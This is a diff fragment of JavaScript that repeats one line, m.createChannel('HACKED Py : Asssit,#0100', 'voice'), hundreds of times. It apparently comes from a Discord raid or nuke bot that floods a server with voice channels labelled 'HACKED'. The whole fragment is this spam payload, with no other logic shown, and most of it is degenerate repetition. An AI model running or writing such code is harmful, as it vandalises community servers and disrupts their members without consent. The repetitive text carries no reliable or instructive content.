+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
